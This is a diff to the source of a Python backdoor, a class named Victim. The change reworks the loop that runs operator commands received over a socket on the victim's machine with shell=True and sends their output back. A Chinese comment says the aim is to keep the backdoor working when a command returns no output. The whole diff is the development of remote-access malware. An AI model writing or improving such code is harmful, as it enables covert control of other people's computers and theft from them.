@@ -58,12 +58,20 @@ class Victim:
                     continue
             else:
                 try:
-                    # startupinfo = subprocess.STARTUPINFO()
-                    # startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                    # result = subprocess.check_output(command, startupinfo=startupinfo)
-                    result = subprocess.check_output(command, shell=True)
-                    self.send_result(self.victimSocket, result)
-                    continue
+                    # 防止某些命令执行后没有结果传输，导致后门无法正常工作的情况发生
+                    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                    if result.returncode == 0:  # 检查命令是否执行成功
+                        # 检查是否有输出
+                        if result.stdout.strip() == "":  # 没有输出
+                            exec_success = "Command executed successfully."
+                            self.send_result(self.victimSocket, exec_success.encode())
+                        else:
+                            self.send_result(self.victimSocket, result.stdout.encode())
+                    # 执行失败
+                    else:
+                        exec_failed = '\033[1;31;31m' + f"[-] Failed to execute the command '{command}'" + '\033[0m'
+                        self.send_result(self.victimSocket, exec_failed.encode())
+                        continue
                 except:
                     exec_failed = '\033[1;31;31m' + "[-] Command execution failed!" + '\033[0m'
                     self.send_result(self.victimSocket, exec_failed.encode())
